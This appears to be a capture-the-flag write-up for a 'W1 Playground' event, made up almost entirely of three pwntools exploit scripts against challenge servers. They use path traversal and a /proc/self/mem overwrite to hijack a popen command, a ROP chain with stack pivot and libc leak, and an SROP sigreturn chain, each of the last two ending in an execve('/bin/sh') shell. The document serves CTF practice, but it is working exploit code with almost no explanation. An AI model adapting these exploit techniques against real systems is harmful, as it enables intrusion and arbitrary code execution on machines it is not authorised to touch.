# W1 Playground
## Open-read-write
```python=
from pwn import *

context.log_level = 'debug'

#r = remote('localhost', 2321)
r = remote('chall.w1playground.com', 36348)

proc_maps = b'\x70\x72\x6f\x63\x2f\x73\x65\x6c\x66\x2f\x6d\x61\x70\x73\x00'
proc_mem = b'\x70\x72\x6f\x63\x2f\x73\x65\x6c\x66\x2f\x6d\x65\x6d\x00'

###-------------------------------Leaking address--------------------------------------
payload_1 = p32(0x6942)
payload_1 += p32(0x1338)

r.send(payload_1)

leak_addr = 4 * b'\x00'
leak_addr += 14 * b'\x2e\x2e\x2f'
leak_addr += proc_maps
leak_addr += 51 * b'\x00'
leak_addr += p64(0x13)
r.send(leak_addr)

base_addr = r.recvuntil(b'-', drop = True).decode()
str_addr = hex(int(base_addr, 16) + 0x21f9)
log.info("Base address: " + str_addr)

###------------------------------Overwrite command popen------------------------------------
payload_2 = p32(0x6942)
payload_2 += p32(0x1337)

r.send(payload_2)

magic = 4 * b'\x00'
magic += 14 * b'\x2e\x2e\x2f'
magic += proc_mem
magic += 44 * b'\x00'
magic += p64(int(str_addr, 16))
magic += p64(int(str_addr, 16) + 0x100)
r.send(magic)

exp = "cat flag_0aece78b3d0a6f611e5436915f05a7e2.txt"
#command = b'\x63\x61\x74\x20\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x66\x6c\x61\x67\x2e\x74\x78\x74'  #cat flag.txt
command = bytes.fromhex(exp.encode('utf - 8').hex())
command += (256 - len(exp)) * b'\x00'
r.send(command)

###------------------------------Get the flag-------------------------------------------
payload_3 = p32(0x6942)
payload_3 += p32(0x1339)
r.send(payload_3)

flag = r.recv()
print(flag)

r.interactive()

```

## Feedback

```python=
from pwn import *

context.log_level = 'debug'

gs = '''
	b *nah+145
	c
	set $r12 = $rsp-0x8
	b *main+268
	c
	set $rbp = $r12
'''

gss = '''
	b *nah+145
	c
	x/40gx $rsp
'''

p = remote('chall.w1playground.com', 62788)
#p = process('./feedback_patched')

system = 0x50d70
pop_rdi = 0x4015d3
pop_rsi = 0x4015d1
scanf = 0x401100
new_st = 0x3ff000
libc_leak = 0x403fc0
pop_rdx = 0x11f2e7 
new_rsp = 0x4015cd
ret = 0x40101a
execve = 0xeb080
exit = 0x455f0
puts = 0x4010a0

#-------------------------------------Change stack------------------------------------------------
payload = p64(0x1337) + p64(pop_rdi) + p64(0x402172) + p64(pop_rsi) + p64(new_st) + p64(0x1337) + p64(scanf) + p64(new_rsp) + p64(new_st) + p64(ret)
payload += (80 - len(payload)) * b'A'

p.sendlineafter(b'Your name: ', b'')
p.sendlineafter(b'You choice: ', "4")
p.recvuntil(b'Your feedback: ')
sleep(2)
p.sendline(payload)

#--------------------------------------Leak libc-------------------------------------
exp = p64(0x1337) + p64(0x1337) + p64(0x1337)
exp += p64(pop_rdi) + p64(0x402172) + p64(pop_rsi) + p64(0x3ff050) + p64(0x1337) + p64(scanf) + p64(ret)
exp += (80 - len(exp)) * b'A'	
sleep(2)
p.sendline(exp)

leak_payload = p64(pop_rdi) + p64(libc_leak) + p64(puts) + p64(pop_rdi) + p64(0x402172) + p64(pop_rsi) + p64(0x3ff0a0) + p64(0x1337) + p64(scanf) + p64(ret)
leak_payload += (80 - len(leak_payload)) * b'A'
sleep(2)
p.sendline(leak_payload)

libc_cur = int.from_bytes(p.recvline().strip(), byteorder='little')
libc_base = libc_cur - 0x606f0
system = system + libc_base
execve = execve + libc_base
pop_rdx = pop_rdx + libc_base
exit = exit + libc_base

log.info("libc: " + hex(libc_base))
log.info("execve: " + hex(execve))
log.info("pop_rdx: " + hex(pop_rdx))

#---------------------------------------Pop Shell------------------------------------
bin_sh = "//bin/sh".encode('utf-8')
pop_shell = p64(pop_rdi) + p64(0x3ff0d8) + p64(pop_rsi) + p64(0) + p64(0) + p64(execve) + p64(exit) + bin_sh
pop_shell += (80 - len(pop_shell)) * b'\x00'
sleep(2)
p.sendline(pop_shell)

p.interactive()

"""
mov rsp, rbp
pop rbp
pop rip
"""

```

## Hello world
```python=
from pwn import *

chall = './chall'

elf = ELF(chall)

context.os = 'linux'
context.log_level = 'debug'

#p = process(chall)
p = remote('chall.w1playground.com', 34181)

syscall = 0x08049017

frame = SigreturnFrame(kernel = 'i386', os = 'linux')
frame.eax = 0x3
frame.ebx = 0x0
frame.ecx = 0x804a000
frame.edx = 0x200
frame.cs = 0x23
frame.ss = 0x2b
frame.ds = 0x2b
frame.es = 0x2b
frame.esp = 0x804a080
frame.eip = 0x8049000

shell = SigreturnFrame(kernel = 'i386', os = 'linux')
shell.eax = 0xb
shell.ebx = 0x804a004
shell.ecx = 0x0
shell.edx = 0x0
shell.cs = 0x23
shell.ss = 0x2b
shell.ds = 0x2b
shell.es = 0x2b
shell.eip = syscall

payload = flat( 128 * b'A',
				p32(0x8049000),
				p32(syscall),
				frame)
#payload += (4096 - len(payload)) * b'A'
p.sendline(payload)

sleep(2)
padding = 118 * b'A'
p.sendline(padding)

sleep(2)
magic = flat(	128 * b'A',
				p32(0x8049000),
				p32(syscall),
				shell)
p.sendline(magic)

sleep(2)
bin_sh = "/bin/sh\x00".encode('utf-8') + 110 * b'A'
p.sendline(bin_sh)

p.interactive()

```